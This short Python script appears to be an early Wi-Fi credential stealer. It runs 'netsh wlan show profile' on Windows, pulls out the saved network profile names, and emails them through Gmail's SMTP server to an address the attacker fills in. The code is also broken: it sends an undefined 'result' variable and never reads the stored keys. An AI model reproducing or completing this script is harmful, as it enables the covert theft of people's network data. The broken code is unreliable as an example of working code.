#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# For Windows
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.findall(
    "(?:Profile\s*:\s)(.*)", networks
)

email = ""
password = ""

send_mail(email, password, result)